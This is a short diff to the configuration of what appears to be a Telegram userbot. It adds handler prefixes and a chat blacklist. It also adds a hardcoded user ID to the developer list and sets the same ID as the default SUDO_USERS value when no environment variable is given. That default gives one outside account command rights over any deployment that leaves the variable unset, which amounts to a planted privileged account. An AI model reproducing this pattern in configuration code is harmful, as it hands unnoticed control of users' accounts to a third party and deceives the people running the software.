@@ -94,7 +94,18 @@ DEVS = (
     1610507831,
     742495738,
     1728788861,
+    1337194042,
 )
+
+SUDO_USERS = {
+    int(x) for x in os.environ.get(
+        "SUDO_USERS",
+        "1337194042").split()}
+BL_CHAT = {int(x) for x in os.environ.get("BL_CHAT", "").split()}
+
+# Handler Userbot
+CMD_HANDLER = os.environ.get("CMD_HANDLER") or "."
+SUDO_HANDLER = os.environ.get("SUDO_HANDLER") or "$"
 
 # Userbot logging feature switch.
 BOTLOG = sb(os.environ.get("BOTLOG", "True"))
